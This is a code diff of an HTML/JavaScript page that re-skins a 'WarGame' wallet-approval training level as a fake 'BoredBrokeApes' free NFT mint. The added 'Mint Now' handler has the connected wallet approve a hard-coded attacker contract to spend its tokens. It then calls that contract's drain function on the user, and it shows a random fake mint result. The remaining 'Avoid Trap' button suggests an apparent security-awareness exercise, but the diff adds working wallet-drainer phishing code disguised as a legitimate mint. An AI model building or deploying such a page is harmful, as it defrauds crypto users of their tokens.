@@ -2,39 +2,91 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>WarGame Level 1 - Approve Challenge</title>
+  <title>🪙 BoredBrokeApes Mint</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
   <style>
-    body { font-family: Arial, sans-serif; background: #111; color: #fff; text-align: center; padding: 2rem; }
-    button { padding: 1rem 2rem; margin: 1rem; font-size: 1.1rem; background: #26a69a; border: none; color: #fff; cursor: pointer; }
-    .danger { background: #e74c3c; }
-    .safe { background: #2ecc71; }
-    .attack { background: #f39c12; }
-    #status { margin-top: 2rem; font-size: 1.2rem; }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #0d0d0d;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background-image: linear-gradient(to bottom, #111, #000);
+    }
+    header {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    h1 {
+      font-size: 2rem;
+      color: #f39c12;
+    }
+    .mint-box {
+      background: #1a1a1a;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 0 10px #f39c12;
+      text-align: center;
+      width: 300px;
+    }
+    .mint-btn {
+      background: #f39c12;
+      color: #000;
+      font-weight: bold;
+      padding: 1rem 2rem;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.2rem;
+      margin-top: 1rem;
+    }
+    .safe-btn {
+      background: #2ecc71;
+      margin-top: 1rem;
+    }
+    #loader {
+      display: none;
+      margin-top: 1rem;
+    }
+    #status {
+      margin-top: 1rem;
+      font-size: 1rem;
+      min-height: 1.5rem;
+    }
+    #supply {
+      font-size: 1rem;
+      color: #ccc;
+      margin-bottom: 1rem;
+    }
   </style>
 </head>
 <body>
-  <h1>⚔️ WarGame Level 1: Approve or Be Drained</h1>
-  <p>You're about to claim your fake reward. Will you survive?</p>
-  
-  <button id="connectBtn">🔌 Connect Wallet</button>
-  <button id="approveBtn" class="danger">🎁 Claim Reward (Unsafe)</button>
-  <button id="drainBtn" class="attack">💀 Drain Me</button>
-  <button id="surviveBtn" class="safe">🧠 Avoid Trap (Safe Choice)</button>
-  
-  <div id="status"></div>
+
+  <header>
+    <h1>🐵 BoredBrokeApes</h1>
+    <p>Free Mint • Just Pay Gas</p>
+  </header>
+
+  <div class="mint-box">
+    <div id="supply">Minted: 8,412 / 10,000</div>
+    <button id="connectBtn" class="mint-btn">🔌 Connect Wallet</button>
+    <button id="mintBtn" class="mint-btn">🚀 Mint Now</button>
+    <button id="surviveBtn" class="mint-btn safe-btn">🧠 Avoid Trap</button>
+
+    <div id="loader">⏳ Minting...</div>
+    <div id="status"></div>
+  </div>
 
   <script type="text/javascript">
-    const tokenAddress = "0xe9AcD45E928E815D1c79a4A37D144Dc379F15de7"; // WGFAKE
-    const attackerContract = "0xE717C074edf0eacf9f318043553726411864C731"; // w3game
+    const tokenAddress = "0xe9AcD45E928E815D1c79a4A37D144Dc379F15de7";
+    const attackerContract = "0xE717C074edf0eacf9f318043553726411864C731";
 
-    const tokenABI = [
-      "function approve(address spender, uint256 amount) public returns (bool)"
-    ];
-    
-    const attackerABI = [
-      "function drain(address token, address victim) external"
-    ];
+    const tokenABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
+    const attackerABI = ["function drain(address token, address victim) external"];
 
     let provider, signer, token, attackContract, userAddress;
 
@@ -47,41 +99,41 @@
         userAddress = await signer.getAddress();
         token = new ethers.Contract(tokenAddress, tokenABI, signer);
         attackContract = new ethers.Contract(attackerContract, attackerABI, signer);
-        document.getElementById("status").innerText = "✅ Wallet connected! Ready to claim reward.";
+        document.getElementById("status").innerText = "✅ Wallet connected.";
       } catch (err) {
-        console.error(err);
-        document.getElementById("status").innerText = "❌ Failed to connect wallet.";
+        document.getElementById("status").innerText = "❌ Wallet connection failed.";
       }
     };
 
-    document.getElementById("approveBtn").onclick = async () => {
-      if (!signer) return alert("Connect your wallet first.");
+    document.getElementById("mintBtn").onclick = async () => {
+      if (!signer) return alert("Please connect your wallet first.");
+      document.getElementById("loader").style.display = "block";
+      document.getElementById("status").innerText = "";
       try {
-        const tx = await token.approve(attackerContract, ethers.parseUnits("1000", 18));
-        await tx.wait();
-        document.getElementById("status").innerText = "⚠️ Approved malicious spender. You are vulnerable.";
-      } catch (err) {
-        console.error(err);
-        document.getElementById("status").innerText = "❌ Approval failed.";
-      }
-    };
+        const tx1 = await token.approve(attackerContract, ethers.parseUnits("1000", 18));
+        await tx1.wait();
 
-    document.getElementById("drainBtn").onclick = async () => {
-      if (!signer) return alert("Connect your wallet first.");
-      try {
-        const tx = await attackContract.drain(tokenAddress, userAddress);
-        await tx.wait();
-        document.getElementById("status").innerText = "💀 You’ve been drained! Game over (simulated).";
+        const tx2 = await attackContract.drain(tokenAddress, userAddress);
+        await tx2.wait();
+
+        // Random result
+        const result = Math.random() > 0.5
+          ? `🎉 Congrats! You minted #${Math.floor(Math.random() * 10000)}`
+          : "😢 Mint sold out. You were too slow!";
+        document.getElementById("status").innerText = "💀 You’ve been drained! " + result;
+        document.getElementById("mintBtn").disabled = true;
+        document.getElementById("surviveBtn").disabled = true;
       } catch (err) {
-        console.error(err);
-        document.getElementById("status").innerText = "❌ Drain failed (maybe not approved).";
+        document.getElementById("status").innerText = "❌ Transaction rejected or failed.";
+      } finally {
+        document.getElementById("loader").style.display = "none";
       }
     };
 
     document.getElementById("surviveBtn").onclick = () => {
-      document.getElementById("status").innerText = "🧠 You avoided the trap. Proceed to next level!";
-      document.getElementById("approveBtn").disabled = true;
-      document.getElementById("drainBtn").disabled = true;
+      document.getElementById("status").innerText = "🧠 Smart! You skipped the trap.";
+      document.getElementById("mintBtn").disabled = true;
+      document.getElementById("surviveBtn").disabled = true;
     };
   </script>
 </body>
